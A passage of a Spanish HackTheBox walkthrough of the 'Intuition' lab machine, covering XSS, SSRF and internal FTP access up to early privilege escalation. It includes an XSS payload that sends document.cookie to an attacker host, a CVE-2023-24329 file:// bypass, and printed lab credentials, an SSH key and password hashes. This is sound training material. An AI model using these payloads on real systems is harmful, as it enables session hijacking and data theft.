---
title: "Máquina Intuition"
description: "Resolución de la máquina Intuition de HackTheBox"
tags: ["XSS", "CVE-2023-24329", "AFR", "SSRF", "Stored credentials", "Suricata", "Reverse engineering"]
categories: ["HackTheBox", "Hard", "Linux"]
logo: "/assets/writeups/intuition/logo.webp"
---

En esta máquina encontraremos un sitio con muchas partes accesibles, una de ellas es vulnerable a XSS y la utilizaremos para ir avanzando en la máquina.

## Enumeración

La máquina solo tiene dos puertos abiertos.

```bash
# Nmap 7.94 scan initiated Sat Apr 27 15:11:04 2024 as: nmap -sS -Pn -n -vvv -p- --open -oN ports --min-rate 100 10.129.52.109
Nmap scan report for 10.129.52.109
Host is up, received user-set (0.28s latency).
Scanned at 2024-04-27 15:11:04 -04 for 141s
Not shown: 61957 closed tcp ports (reset), 3576 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Apr 27 15:13:25 2024 -- 1 IP address (1 host up) scanned in 141.31 seconds
```

El sitio web principal se ve atractivo, nos da una opción para subir archivos que posteriormente serán comprimidos con el algoritmo LZMA

![Webpage](/assets/writeups/intuition/1.png)

En el footer podremos ver una parte que nos dice que podemos reportar bugs en la aplicación, nos manda al subdominio `report.comprezzor.htb` que nos da un botón para abrir un formulario donde podremos reportar los respectivos bugs

![Report page](/assets/writeups/intuition/2.png)

También nos indican que pasa exactamente con los reportes

> At Comprezzor, we take bug reports seriously. Our dedicated team of developers diligently examines each bug report and strives to provide timely solutions to enhance your experience with our services.
>
> How Bug Reports Are Handled:
>  - Every reported bug is carefully reviewed by our skilled developers.
>  - If a bug requires further attention, it will be escalated to our administrators for resolution.
>  - We value your feedback and continuously work to improve our system based on your bug reports.
>
>Reporting bugs helps us enhance our services and ensures a seamless experience for all users. We appreciate your participation in making Comprezzor better.
>
>If you encounter any issues or have suggestions, please do not hesitate to contact us.

Ya podemos ir pensando en que hacer sabiendo que sucede acá.

## Intrusión

### Dashboard admin - comprezzor.htb

Antes de proseguir, si le damos al botón para subir el reporte nos mandará a un subdominio nuevo llamado `auth.comprezzor.htb`, que nos pedirá autenticación, pero de todos modos nos deja registrarnos:

![Login](/assets/writeups/intuition/3.png)

Ahora, luego de registrarse; Si intentamos colar una etiqueta HTML que carge un recurso de una web que nosotros controlemos dentro de algún campo del reporte, recibiremos una petición en esa misma web:

`<img src="http://<your-ip>:<port>/test.png">`

```bash
❯ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.15 - - [16/Sep/2024 12:06:40] code 404, message File not found
10.10.11.15 - - [16/Sep/2024 12:06:40] "GET /test.png HTTP/1.1" 404 
```

Si nos fijamos en las cookies de la página, podemos ver que la `user_data` no tiene puesto el HttpOnly, por lo que ahora podemos simplemente introducir un payload XSS que nos mande las cookie del usuario

```html
<img src="http://<your-ip>:<port>/test.png" onerror="fetch(`http://<your-ip>:<port>/?cookie=${document.cookie}`)">
```

```bash
❯ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.15 - - [16/Sep/2024 12:10:50] code 404, message File not found
10.10.11.15 - - [16/Sep/2024 12:10:50] "GET /test.png HTTP/1.1" 404 -
10.10.11.15 - - [16/Sep/2024 12:10:50] "GET /?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 200 -
```

Ahora podemos colocarnos esta cookie en nuestro navegador e impersonar a este usuario... pero solamente sabemos acerca del sitio de reportes y nada más, ¿cuál será el lugar donde este usuario pudo ver nuestro reporte?

Fuzzeando por subdominios, podemos encontrar cosas:

```bash
❯ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.comprezzor.htb" -fs 178 -mc all -u http://10.10.11.15

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.15
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.comprezzor.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

auth                    [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 139ms]
report                  [Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 138ms]
dashboard               [Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 139ms]
```

En el subdominio de dashboard, ya podremos ver cositas:

![Dashboard](/assets/writeups/intuition/4.png)

Somos el usuario `webdev` como podemos ver, entre los reportes podremos leer como los bugs que tiene el sitio, pero no hay nada que nos sea de utilidad. Viendo lo que podemos hacer con los reportes encontramos tres botones:

![Buttons](/assets/writeups/intuition/5.png)

El de establecer alta prioridad llama la atención, porque si generamos un reporte y le damos al botoncito evidentemente le cambiará la prioridad al reporte, podemos pensar que hay otro usuario viendo el dashboard, y probablemente tenga más privilegios que nosotros.

Generando un reporte con un payload XSS y subiéndole la prioridad, hará que dentro de un momento recibamos otra petición a nuestro servidor web además de las nuestras (Encima de que alguien mira esto, nosotros mismos nos vamos a tener que comer el XSS para poder establecerle la prioridad)

```bash
❯ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.149 - - [16/Sep/2024 12:21:32] code 404, message File not found
10.10.14.149 - - [16/Sep/2024 12:21:32] "GET /test.png HTTP/1.1" 404 -
10.10.14.149 - - [16/Sep/2024 12:21:32] "GET /?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 200 -
10.10.11.15 - - [16/Sep/2024 12:21:44] code 404, message File not found
10.10.11.15 - - [16/Sep/2024 12:21:44] "GET /test.png HTTP/1.1" 404 -
10.10.11.15 - - [16/Sep/2024 12:21:44] "GET /?cookie=user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 HTTP/1.1" 200 -
```

Decodificando el base64, podemos ver que es el usuario de máximos privilegios en un sitio web, normalmente

```bash
❯ echo 'eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5' | base64 -d     
{"user_id": 1, "username": "admin", "role": "admin"}|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9
```

Al colocarnósla, tendremos acceso a una nueva barra dentro del mismo dashboard:

![New bar](/assets/writeups/intuition/6.png)

### dev_acc - intuition

Los primeros dos botones no nos llevan a algo interesante, pero la función de generar PDFs nos permite generar un reporte pdf de la página web que reside en la URL que coloquemos... pero si colocamos esquemas de url como `file://` donde sea, la web nos tirará un error. 

Viendo un poco más a fondo, si ponemos un listener netcat y dejamos que mande la petición al respectivo listener veremos las cabeceras:

```bash
❯ nc -lvnp 8000        
Listening on 0.0.0.0 8000
Connection received on 10.10.11.15 39538
GET / HTTP/1.1
Accept-Encoding: identity
Host: 10.10.14.149:8000
User-Agent: Python-urllib/3.11
Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
Connection: close
```

Esa versión de la librería urllib tiene una vulnerabilidad catalogada como `CVE-2023-24329`:

> *An issue in the urllib.parse component of Python before 3.11.4 allows attackers to bypass blocklisting methods by supplying a URL that starts with blank characters.*

Eso ya nos dice mucho. Por lo que entonces si colocamos  

```bash 
 file:///etc/passwd
```

La página web nos devolverá:

![uh oh](/assets/writeups/intuition/7.png)
*Los usuarios del passwd ya nos permite intuir que probablemente esto sea un contenedor Docker*

Bien, podemos leer archivos en la máquina arbitrariamente; en este momento nos interesaría mucho ver el código fuente del aplicativo Python, y ficheros como el `/proc/self/cmdline` nos dirá donde está almacenada la aplicación

`python3/app/code/app.py`

Viéndolo, podemos encontrar esto (luego de acodomarlo)

```python
from flask import Flask, request, redirect
from blueprints.index.index import main_bp
from blueprints.report.report import report_bp
from blueprints.auth.auth import auth_bp
from blueprints.dashboard.dashboard import dashboard_bp

app = Flask(__name__)
app.secret_key = "7ASS7ADA8RF3FD7"
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # Limit file size to 5MB
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'}  # Add more allowed file extensions if needed


app.register_blueprint(main_bp)
app.register_blueprint(report_bp,  subdomain='report')
app.register_blueprint(auth_bp,  subdomain='auth')
app.register_blueprint(dashboard_bp,  subdomain='dashboard')


if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=80)
```

Podemos ver los blueprints, sabiendo como funcionan los modulos de Python podemos pensar que estarán ubicados en `/app/code/blueprints/*/*.py`

Viendo por ejemplo, el dashboard podemos encontrar ya algo súper interesante:

```python
from flask import Blueprint, request, render_template, flash, redirect, url_for, send_file
from blueprints.auth.auth_utils import admin_required, login_required, deserialize_user_data

from blueprints.report.report_utils import get_report_by_priority, get_report_by_id, delete_report, get_all_reports, change_report_priority, resolve_report
import random, os, pdfkit, socket, shutil
import urllib.request
from urllib.parse import urlparse
import zipfile
from ftplib import FTP
from datetime import datetime

dashboard_bp = Blueprint('dashboard', __name__, subdomain='dashboard')
pdf_report_path = os.path.join(os.path.dirname(__file__), 'pdf_reports')
allowed_hostnames = ['report.comprezzor.htb']


@dashboard_bp.route('/', methods=['GET'])
@admin_required
def dashboard():

    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)

    if user_info['role'] == 'admin':
        reports = get_report_by_priority(1)
  
    elif user_info['role'] == 'webdev':
        reports = get_all_reports()

    return render_template('dashboard/dashboard.html', reports=reports, user_info=user_info)

@dashboard_bp.route('/report/<report_id>', methods=['GET'])
@login_required
def get_report(report_id):
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] in ['admin', 'webdev']:
        report = get_report_by_id(report_id)
        return render_template('dashboard/report.html', report=report, user_info=user_info)
    else:
        pass

@dashboard_bp.route('/delete/<report_id>', methods=['GET'])
@login_required
def del_report(report_id):
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] in ['admin', 'webdev']:
        report = delete_report(report_id)
        return redirect(url_for('dashboard.dashboard'))
    else:
        pass

@dashboard_bp.route('/resolve', methods=['POST'])
@login_required
def resolve():
    report_id = int(request.args.get('report_id'))

    if resolve_report(report_id):
        flash('Report resolved successfully!', 'success')
    else:
        flash('Error occurred while trying to resolve!', 'error')

    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/change_priority', methods=['POST'])
@admin_required
def change_priority():
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)

    if user_info['role'] != ('webdev' or 'admin'):
        flash('Not enough permissions. Only admins and webdevs can change report priority.', 'error')
        return redirect(url_for('dashboard.dashboard'))

    report_id = int(request.args.get('report_id'))
    priority_level = int(request.args.get('priority_level'))

    if change_report_priority(report_id, priority_level):
        flash('Report priority level changed!', 'success')
    else:
        flash('Error occurred while trying to change the priority!', 'error')

    return redirect(url_for('dashboard.dashboard'))


@dashboard_bp.route('/create_pdf_report', methods=['GET', 'POST'])
@admin_required
def create_pdf_report():
    global pdf_report_path

    if request.method == 'POST':
        report_url = request.form.get('report_url')

        try:

            scheme = urlparse(report_url).scheme
            hostname = urlparse(report_url).netloc
            try:
                dissallowed_schemas = ["file", "ftp", "ftps"]
                if (scheme not in dissallowed_schemas) and ((socket.gethostbyname(hostname.split(":")[0]) != '127.0.0.1') or (hostname in allowed_hostnames)):
                    print(scheme)
                    urllib_request = urllib.request.Request(report_url, headers={'Cookie': 'user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5'})

                    response = urllib.request.urlopen(urllib_request)
                    html_content = response.read().decode('utf-8')

                    pdf_filename = f'{pdf_report_path}/report_{str(random.randint(10000,90000))}.pdf'
                    pdfkit.from_string(html_content, pdf_filename)

                    return send_file(pdf_filename, as_attachment=True)
            except:
                flash('Unexpected error!', 'error')
                return render_template('dashboard/create_pdf_report.html')                

            else:
                flash('Invalid URL', 'error')
                return render_template('dashboard/create_pdf_report.html')

        except Exception as e:
            raise e
    else:
        return render_template('dashboard/create_pdf_report.html')


@dashboard_bp.route('/backup', methods=['GET'])
@admin_required
def backup():

    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../')

    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
    backup_filename = f'app_backup_{current_datetime}.zip'


    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(source_directory):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_directory)
                zipf.write(file_path, arcname=arcname)

    try:
        ftp = FTP('ftp.local')
        ftp.login(user='ftp_admin', passwd='u3jai8y71s2')
        ftp.cwd('/')
        with open(backup_filename, 'rb') as file:
            ftp.storbinary(f'STOR {backup_filename}', file)
        ftp.quit()

        os.remove(backup_filename)

        flash('Backup and upload completed successfully!', 'success')
    except Exception as e:
        flash(f'Error: {str(e)}', 'error')

    return redirect(url_for('dashboard.dashboard'))
```

Podemos ver las credenciales de un usuario FTP para `ftp.local` sin embargo esto no está expuesto al exterior ya que es algo interno, pero podemos intentar usar lo que vimos del PDF anteriormente para acceder a este servidor, ya que está cargando el recurso primero y luego guarda lo devuelto en el PDF (Sí, vamos a acceder a un FTP a punta de PDFs)

Colocando la siguiente URL dentro de la utilidad:

```bash
 ftp://ftp_admin:u3jai8y71s2@ftp.local/
```

Nos devuelve un PDF con el siguiente contenido:

```bash
-rw------- 1 root root 2655 Sep 16 16:50 private-8297.key -rw-r--r-- 1 root root 15519 Sep 16 16:50 welcome_note.pdf -rw-
r--r-- 1 root root 1732 Sep 16 16:50 welcome_note.txt
```

Una nota en txt y una llave privada, la nota dice lo siguiente:

```bash
Dear Devs, We are thrilled to extend a warm welcome to you as you embark on this exciting journey with us. Your
arrival marks the beginning of an inspiring chapter in our collective pursuit of excellence, and we are genuinely
delighted to have you on board. Here, we value talent, innovation, and teamwork, and your presence here reaffirms our
commitment to nurturing a diverse and dynamic workforce. Your skills, experience, and unique perspectives are
invaluable assets that will contribute significantly to our continued growth and success. As you settle into your new
role, please know that you have our unwavering support. Our team is here to guide and assist you every step of the way,
ensuring that you have the resources and knowledge necessary to thrive in your position. To facilitate your work and
access to our systems, we have attached an SSH private key to this email. You can use the following passphrase to
access it, `Y27SH19HDIWD`. Please ensure the utmost confidentiality and security when using this key. If you have any
questions or require assistance with server access or any other aspect of your work, please do not hesitate to reach out
for assistance. In addition to your technical skills, we encourage you to bring your passion, creativity, and innovative
thinking to the table. Your contributions will play a vital role in shaping the future of our projects and products. Once
again, welcome to your new family. We look forward to getting to know you, collaborating with you, and witnessing
your exceptional contributions. Together, we will continue to achieve great things. If you have any questions or need
further information, please feel free to me at adam@comprezzor.htb. Best regards, Adam
```
{: file="welcome_note.txt"}

y la llave privada es para SSH, como lo indica el texto:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
XxwXArPr6+HQe9hZSjI2hjYC2OU= 
-----END OPENSSH PRIVATE KEY-----
```
{: file="private-8297.key"}

Pues bien, no sabemos ni de que usuario es, pero utilizando `ssh-keygen` y la contraseña podemos verlo:

```bash
❯ ssh-keygen -y -f id_rsa 
Enter passphrase: 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6udKETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lAKK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BRBdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JXU0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQkTlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbcJFGDBQ+X3QelE= dev_acc@local
```

Derivando la llave pública de la privada, ya podremos ver un comentario que nos da el nombre de la cuenta a la que le pertenece esto. Podemos acceder por SSH sin problemas con ella:

```bash
❯ ssh -i id_rsa dev_acc@comprezzor.htb
Enter passphrase for key 'id_rsa': 
dev_acc@intuition:~$ 
```

y en el directorio personal del mismo usuario podremos encontrar la primera flag.

```bash
dev_acc@intuition:~$ ls -la
total 28
drwxr-x--- 4 dev_acc dev_acc 4096 Apr  9 18:26 .
drwxr-xr-x 5 root    root    4096 Apr 25 11:49 ..
lrwxrwxrwx 1 root    root       9 Apr  9 18:26 .bash_history -> /dev/null
-rw-r--r-- 1 dev_acc dev_acc 3771 Sep 17  2023 .bashrc
drwx------ 2 dev_acc dev_acc 4096 Apr  4 16:21 .cache
-rw-r--r-- 1 dev_acc dev_acc  807 Sep 17  2023 .profile
drwx------ 2 dev_acc dev_acc 4096 Oct  8  2023 .ssh
-rw-r----- 1 root    dev_acc   33 Sep 16 10:06 user.txt
dev_acc@intuition:~$ cat user.txt
55814eb39e2e9b4e5cb550f0cb******
```

## Escalada de privilegios

### lopez - intuition 

Eh... devolvamonos a unos minutos antes.

Si leíste el código del aplicativo donde sacamos la credencial para FTP, habíamos visto que cuando haciamos backups se subían al mismo lugar de donde tomamos la llave SSH, eso significa que podemos obtener una copia de toda la aplicación con base de datos incluida del mismo ftp.

Afortunadamente, esta máquina cuenta con el software para el comando `ftp` asi que no tendremos que hacer port forwading; haciendo click en el botón de backup y viendo el ftp podremos encontrar el respectivo backup

```bash
dev_acc@intuition:/home$ ftp 172.21.0.1
Connected to 172.21.0.1.
220 pyftpdlib 1.5.7 ready.
Name (172.21.0.1:dev_acc): ftp_admin
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering extended passive mode (|||51291|).
125 Data connection already open. Transfer starting.
-rw-r--r--   1 root     root        53098 Sep 16 17:14 app_backup_20240916171523.zip
-rw-------   1 root     root         2655 Sep 16 17:10 private-8297.key
-rw-r--r--   1 root     root        15519 Sep 16 17:10 welcome_note.pdf
-rw-r--r--   1 root     root         1732 Sep 16 17:10 welcome_note.txt
226 Transfer complete.
```

> También puedes obtener una copia del sitio completo simplemente yendo a `/var/www/app` xd
{: .prompt-info }

Descárgandolo y extrayendolo, podremos ver cositas:

```bash
... [snip]
 inflating: blueprints/report/reports.db  
  inflating: blueprints/report/reports.sql  
  inflating: blueprints/report/__pycache__/report_utils.cpython-310.pyc  
  inflating: blueprints/report/__pycache__/contact.cpython-310.pyc  
  inflating: blueprints/report/__pycache__/report.cpython-311.pyc  
  inflating: blueprints/report/__pycache__/utils.cpython-310.pyc  
  inflating: blueprints/report/__pycache__/report.cpython-310.pyc  
  inflating: blueprints/report/__pycache__/report_utils.cpython-311.pyc  
  inflating: blueprints/dashboard/dashboard.py  
  inflating: blueprints/dashboard/__pycache__/dashboard.cpython-311.pyc  
  inflating: blueprints/dashboard/__pycache__/dashboard.cpython-310.pyc  
  inflating: blueprints/index/index.py  
  inflating: blueprints/index/__pycache__/index.cpython-311.pyc  
  inflating: blueprints/index/__pycache__/index.cpython-310.pyc  
  inflating: __pycache__/app.cpython-310.pyc  
  inflating: __pycache__/app.cpython-311.pyc  
  inflating: __pycache__/dispatcher.cpython-310.pyc  
  inflating: __pycache__/config.cpython-310.pyc  
  inflating: templates/auth/login.html  
  inflating: templates/auth/register.html  
  inflating: templates/report/report_details.html  
  inflating: templates/report/about_reports.html  
  inflating: templates/report/index.html  
  inflating: templates/report/report_bug_form.html  
  inflating: templates/report/report_list.html  
  inflating: templates/dashboard/report.html  
  inflating: templates/dashboard/dashboard.html  
  inflating: templates/dashboard/backup.html  
  inflating: templates/dashboard/create_pdf_report.html  
  inflating: templates/index/index.html  
dev_acc@intuition:/tmp/uwu$ ls
app_backup_20240916171523.zip  app.py  blueprints  __pycache__  templates
```
En el directorio del blueprint de autenticación encontraremos la base de datos

```bash
dev_acc@intuition:/tmp/uwu/blueprints/auth$ ls -la
total 40
drwxrwxr-x 3 dev_acc dev_acc  4096 Sep 16 17:17 .
drwxrwxr-x 6 dev_acc dev_acc  4096 Sep 16 17:17 ..
-rw-r--r-- 1 dev_acc dev_acc  1842 Sep 18  2023 auth.py
-rw-r--r-- 1 dev_acc dev_acc  3038 Sep 19  2023 auth_utils.py
drwxrwxr-x 2 dev_acc dev_acc  4096 Sep 16 17:17 __pycache__
-rw-r--r-- 1 dev_acc dev_acc 16384 Sep 16 17:15 users.db
-rw-r--r-- 1 dev_acc dev_acc   171 Sep 18  2023 users.sql
```

En la tabla de usuarios podremos encontrar solo dos hashes

```bash
sqlite> select * from users;
1|admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606|admin
2|adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43|webdev
```

Solamente el de adam es crackeable.

```bash
❯ hashcat hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)) | Framework

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray
```

Sin embargo, esta contraseña no sirve para autenticarnos como adam en el sistema... pero si sirve para ir por FTP:

```bash
dev_acc@intuition:/tmp/uwu/blueprints/auth$ ftp 172.21.0.1
Connected to 172.21.0.1.
220 pyftpdlib 1.5.7 ready.
Name (172.21.0.1:dev_acc): adam
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering extended passive mode (|||45777|).
125 Data connection already open. Transfer starting.
drwxr-xr-x   3 root     1002         4096 Apr 10 08:21 backup
226 Transfer complete.
```

En el directorio de backup podemos encontrar estos archivos:

```bash
ftp> ls -la
229 Entering extended passive mode (|||41681|).
125 Data connection already open. Transfer starting.
drwxr-xr-x   2 root     1002         4096 Apr 10 08:21 runner1
226 Transfer complete.
ftp> cd runner1
250 "/backup/runner1" is the current directory.
ftp> ls
229 Entering extended passive mode (|||47271|).
125 Data connection already open. Transfer starting.
-rwxr-xr-x   1 root     1002          318 Apr 06 00:25 run-tests.sh
-rwxr-xr-x   1 root     1002        16744 Oct 19  2023 runner1
